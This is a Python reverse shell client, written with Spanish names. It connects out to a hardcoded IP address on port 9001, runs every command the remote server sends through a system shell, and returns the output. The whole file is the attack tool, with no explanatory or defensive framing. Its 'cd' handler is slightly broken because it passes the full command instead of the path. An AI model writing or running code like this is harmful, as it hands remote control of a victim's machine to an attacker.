import subprocess
import threading
import socket
import sys
import os

puerto = int(9001)
host = '201.105.196.129'

FIN_COMANDO = b'#00#'


def mandar_comando(comando, socket):
    comando += FIN_COMANDO
    socket.send(comando)

def ejecutar_comando(comando):
    comando = comando.decode('utf-8') 
    proc = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    salida, error = proc.communicate()
    if error:
        return False
    return salida

def leer_comando(cliente):
    comando = cliente.recv(2048)
    while not comando.endswith(FIN_COMANDO):
        comando += cliente.recv(2048)
    quitar_caracteres = len(FIN_COMANDO)
    return comando[:-quitar_caracteres]

def atender_servidor(cliente):
    comando = ''
    while comando != b'exit':
        comando = leer_comando(cliente)
        if comando.startswith(b'cd'):
            ruta = extraer_ruta_cd(comando)
            if ruta == False:
                salida = False
            else:
                salida = ejecutar_cd(comando)
        else:
            salida = ejecutar_comando(comando)
        if salida == False:
            mandar_mensaje(b'command not found', cliente)
        else:
            mandar_comando(salida, cliente)
    cliente.close()

def ejecutar_cd(ruta):
    try:
        os.chdir(ruta)
        return b''
    except FileNotFoundError:
        return False

def extraer_ruta_cd(comando):
    partes = comando.split(b' ')
    if len(partes) != 2:
        return False
    return partes[1]

def mandar_mensaje(mensaje, socket):
    mensaje += FIN_COMANDO
    socket.send(mensaje)

def inicializar_conexion(host, puerto):
    cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try: 
            cliente.connect((host, puerto))
        except:
            print('No se pudo establecer conexión con el servidor')
            exit(1)
        return cliente

if __name__ == '__main__':
    socket = inicializar_conexion(host, puerto)
    shell = threading.Thread(target=atender_servidor, args=(socket, ))
    shell.start()
